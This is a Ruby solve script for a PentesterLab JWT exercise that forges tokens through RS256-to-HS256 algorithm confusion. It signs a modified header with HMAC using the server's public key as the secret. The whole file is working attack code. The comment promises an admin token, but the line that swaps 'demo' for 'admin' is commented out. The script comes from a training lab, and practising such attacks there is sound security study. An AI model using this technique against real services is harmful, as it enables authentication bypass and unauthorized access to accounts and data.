# script to create an admin JWT token for auth bypass.
# used to solve JWT2 exercise on PentesterLab's Yellow Badge.


require 'base64'
require 'openssl'


pub = File.open("public.pem").read




TOKEN = 
"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImRlbW8ifQ.abcWIUU4HvocTw1aiP44hjawkr5CUTTjRAb0QCb00l82vJjjs5Nuilm10eQMkGGlleH_99MSMgZZ8xlZksOtVWmcXXflAOm0pLiDhol_Fpnak-BMSUmc9CjtJvFy_0qkmKz8T4QWZ7gG2XjRGcsueNKS-Hx9ExGDlLAGsdmiwMiLzuNeO7iW7ECG9nUrNMpArL3s9cMi-NBiSQQd3DkJLNPZzk2J0Ew-aM3Z744uBH38oNKl4n2ktr4baQMxMIe7pecNLzGgQnZ9UPt-kgzqzPActSK0H4CLhJAekNv3QgOhtJxfeF3e9bMkVx8E4rhTnX4gTqfeu1CX-r1VCtaLdQ"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoded_header.gsub!("RS256", "HS256")
puts decoded_header
new_header = Base64.strict_encode64(decoded_header).gsub("=","")

decoded_payload= Base64.decode64(payload)
#decoded_payload.gsub!("demo", "admin")
puts decoded_payload
new_payload = Base64.strict_encode64(decoded_payload).gsub("=","")

data = new_header+"."+new_payload

signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), pub, data))

puts data+"."+signature
